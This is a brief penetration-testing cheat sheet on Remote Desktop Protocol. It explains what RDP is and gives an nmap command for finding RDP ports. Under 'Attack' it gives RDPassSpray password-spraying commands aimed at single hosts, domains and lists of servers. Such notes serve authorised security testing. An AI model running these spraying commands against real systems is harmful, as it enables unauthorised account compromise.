--- ---
<h2>What is RDP</h2>
RDP stands for Remote Desktop Protocol, which is a proprietary protocol developed by Microsoft that allows users to access and control a computer remotely over a network connection. With RDP, users can connect to a remote computer and interact with it as if they were sitting in front of it, using their own keyboard, mouse, and monitor.

---
<h3>Find RDP ports</h3>
- Nmap
```Terminal
nmap -sV -sC IP -p3026,3389
```

- Possible to find RDP on an other port

---
<h3>Attack</h3>
- Brute Force (https://github.com/xFreed0m/RDPassSpray)
```Terminal
python3 RDPassSpray.py -h

python3 RDPassSpray.py -U USERNAMES.txt -p Spring2021! -t IP:PORT

python3 RDPassSpray.py -U USERNAMES.txt -p Spring2021! -d DOMAIN -T RDP_servers.txt
```

- -U                   ---> Username List
- -p                    ---> Single Password
- -d                    ---> Windows Domain
- -t                     ---> Targets (List of IP's)